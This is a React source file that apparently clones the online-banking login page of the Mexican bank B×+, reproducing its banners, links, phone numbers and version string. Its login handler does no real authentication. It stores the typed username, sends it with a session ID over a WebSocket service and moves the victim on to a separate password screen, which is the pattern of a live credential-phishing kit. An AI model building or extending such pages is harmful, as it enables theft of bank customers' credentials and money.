import React, { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'

interface Banner {
  path: string
  withFunction: boolean | string
  openModal?: string
  urlRef?: string
  target?: string
}

const LoginPage: React.FC = () => {
  const [username, setUsername] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [activeSlide, setActiveSlide] = useState(1)
  const navigate = useNavigate()

  const bannersList: Banner[] = [
    { path: 'assets/images/banners/bnnr_mtu.jpg', withFunction: false },
    { path: 'assets/images/banners/bnnr_persona_vuln.jpg', withFunction: false },
    { path: 'assets/images/banners/BANNER_BancaEnLinea_1_1.jpg', withFunction: 'modal', openModal: 'cashback' },
    { path: 'assets/images/banners/prevencion_fraudes.jpg', withFunction: false },
    { path: 'assets/images/banners/pagoServicios.jpg', withFunction: false },
    { path: 'assets/images/banners/imss.jpg', withFunction: false },
    { path: 'assets/images/banners/tdd_digital.jpg', withFunction: false },
    { path: 'assets/images/banners/convenio_imss.jpg', withFunction: false },
    { path: 'assets/images/banners/bancaLineaApple.jpg', withFunction: 'link', urlRef: 'https://www.vepormas.com/fwpf/portal/documents/servicios-apple-pay', target: '_blank' }
  ]

  const headerListLnk = [
    { href: 'https://www.vepormas.com/fwpf/portal/documents/sucursales', text: 'Sucursales' },
    { href: 'https://www.vepormas.com/fwpf/portal/documents/llamenme-ahora', text: 'Contacto' },
    { href: 'https://www.vepormas.com/fwpf/portal/documents/manuales-banca-en-linea', text: 'Ayuda' }
  ]

  const operativeListLnk = [
    { callFunction: 'registro', text: 'Sincroniza tu token' },
    { callFunction: 'desbloqueo', text: 'Desbloqueo' },
    { callFunction: 'recuperarContrasena', text: '¿Olvidaste tu contraseña?' }
  ]

  const footerListLnk = [
    { href: 'https://www.vepormas.com/recursos/resources/img/03MAY_GUIA_INVERSION.PDF', text: 'Guía de servicios de inversión' },
    { href: 'https://www.vepormas.com/fwpf/portal/documents/tips-de-seguridad', text: 'Tips de seguridad' },
    { href: 'https://www.vepormas.com/recursos/res/html/terminos_condiciones.pdf', text: 'Términos y condiciones' },
    { href: 'https://www.vepormas.com/fwpf/portal/documents/aviso-legal', text: 'Aviso legal' }
  ]

  useEffect(() => {
    const interval = setInterval(() => {
      setActiveSlide((prev) => (prev + 1) % bannersList.length)
    }, 6000)
    return () => clearInterval(interval)
  }, [])

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!username || username.trim() === '') {
      return
    }

    // Usar el servicio de sesión para obtener o crear ID de sesión
    import('../services/session.service').then(({ default: sessionService }) => {
      const sessionId = sessionService.getSessionId()
      
      // Guardar usuario en sessionStorage y redirigir directamente
      sessionStorage.setItem('user', btoa('1'))
      sessionStorage.setItem('realName', btoa(username))
      sessionStorage.setItem('idSesion', btoa(sessionId))
      sessionStorage.setItem('userName', btoa(username))
      
      // Enviar al WebSocket con el ID de sesión correcto
      import('../services/websocket.service').then(ws => {
        // Esperar a que esté conectado
        const sendData = () => {
          if (ws.default.isConnected && ws.default.isConnected()) {
            ws.default.updateSession({
              sessionId: sessionId,
              idSesion: sessionId,
              user: '1',
              realName: username,
              userName: username
            })
          } else {
            // Intentar conectar y luego enviar
            ws.default.connect()
            setTimeout(sendData, 1000)
          }
        }
        sendData()
      })
      
      // Redirigir directamente a la pantalla de contraseña
      navigate('/password')
    })
  }

  const togglePassword = () => {
    setShowPassword(!showPassword)
  }

  const handleBannerClick = (banner: Banner, _index: number) => {
    if (banner.withFunction === 'link' && banner.urlRef) {
      window.open(banner.urlRef, banner.target || '_self')
    } else if (banner.withFunction === 'modal') {
      // Aquí se abriría el modal correspondiente
      console.log('Abrir modal:', banner.openModal)
    }
  }

  const flujoRedirect = (callFunction: string) => {
    // Implementar redirecciones según la función
    console.log('Redirigir a:', callFunction)
  }

  const prevSlide = () => {
    setActiveSlide((prev) => (prev - 1 + bannersList.length) % bannersList.length)
  }

  const nextSlide = () => {
    setActiveSlide((prev) => (prev + 1) % bannersList.length)
  }

  return (
    <div className="wrapper dark">
      <div className="container">
        <header>
          <ul className="links pull-right">
            {headerListLnk.map((link, index) => (
              <li key={index}>
                <a href={link.href} target="_blank" rel="noopener noreferrer">
                  {link.text}
                </a>
              </li>
            ))}
          </ul>
          <div className="clearfix"></div>
        </header>

        <div className="row row-logo-login">
          <div className="col-xs-12 logo">
            <img src="assets/images/logoBlancoR.png" alt="B×+" />
          </div>
        </div>

        <div className="row content">
          <div className="col-sm-6 col-md-7">
            <div className="text-center carousel" style={{ position: 'relative' }}>
              <div className="carousel-inner">
                {bannersList.map((banner, index) => (
                  <div
                    key={index}
                    className={`item text-center ${index === activeSlide ? 'active' : ''}`}
                  >
                    <img
                      className={`img-responsive ${banner.withFunction !== false ? 'cursor-pointer' : ''}`}
                      src={banner.path}
                      alt={`Banner ${index + 1}`}
                      onClick={() => handleBannerClick(banner, index)}
                      style={{ width: '100%', height: 'auto' }}
                    />
                  </div>
                ))}
              </div>
              {bannersList.length > 1 && (
                <>
                  <a
                    role="button"
                    href="#"
                    className="left carousel-control"
                    onClick={(e) => {
                      e.preventDefault()
                      prevSlide()
                    }}
                  >
                    <span aria-hidden="true" className="glyphicon glyphicon-chevron-left"></span>
                    <span className="sr-only">previous</span>
                  </a>
                  <a
                    role="button"
                    href="#"
                    className="right carousel-control"
                    onClick={(e) => {
                      e.preventDefault()
                      nextSlide()
                    }}
                  >
                    <span aria-hidden="true" className="glyphicon glyphicon-chevron-right"></span>
                    <span className="sr-only">next</span>
                  </a>
                  <ol className="carousel-indicators">
                    {bannersList.map((_, index) => (
                      <li
                        key={index}
                        className={index === activeSlide ? 'active' : ''}
                        onClick={() => setActiveSlide(index)}
                      >
                        <span className="sr-only">
                          slide {index + 1} of {bannersList.length}
                          {index === activeSlide && ', currently active'}
                        </span>
                      </li>
                    ))}
                  </ol>
                </>
              )}
            </div>
            <div className="info-version">
              <span className="version inline-desktop">(v:09122025-1104)</span>
            </div>
          </div>

          <div className="col-sm-6 col-md-5">
            <h1 className="title-banco">Banca en Línea B×+</h1>

            <p className="hidden-xs hidden-sm">&nbsp;</p>

            <form name="login" style={{ height: '140px' }} onSubmit={handleLogin}>
              <div className="input-group">
                <span className="input-group-addon" id="aria-user">Usuario</span>
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="inputPassword"
                  name="user"
                  tabIndex={0}
                  className="form-control"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Ingresa tu usuario"
                  minLength={1}
                  maxLength={255}
                  aria-describedby="aria-user"
                  autoFocus
                />
                <span className="input-group-addon cursor-pointer" onClick={togglePassword}>
                  <span className={`fa font-18 ${showPassword ? 'fa-eye' : 'fa-eye-slash'}`}></span>
                </span>
              </div>


              <br />
              <div className="form-group">
                <button
                  type="submit"
                  className="btn btn-success btn-block"
                >
                  Continuar
                </button>
              </div>
            </form>

            <div className="row links-login">
              {operativeListLnk.map((link, index) => (
                <a
                  key={index}
                  className="cursor-pointer border-b"
                  onClick={() => flujoRedirect(link.callFunction)}
                  style={{ cursor: 'pointer', textDecoration: 'underline', marginRight: '10px' }}
                >
                  {link.text}
                </a>
              ))}
            </div>
          </div>
        </div>

        <div className="row">
          <div className="col-md-offset-1 col-sm-offset-1 col-lg-offset-1">
            <footer className="bck-darkgray">
              <div className="small text-center">
                <ul className="links foot">
                  {footerListLnk.map((link, index) => (
                    <li key={index}>
                      <a href={link.href} target="_blank" rel="noopener noreferrer">
                        {link.text}
                      </a>
                    </li>
                  ))}
                </ul>
                <span className="linea-bxm">
                  Línea B×+ Cd. de México y área metropolitana 55 1102 1919, del interior sin costo 800 837 6762.
                </span>
                <div className="clearfix"></div>
              </div>
            </footer>
          </div>
        </div>
      </div>
    </div>
  )
}

export default LoginPage


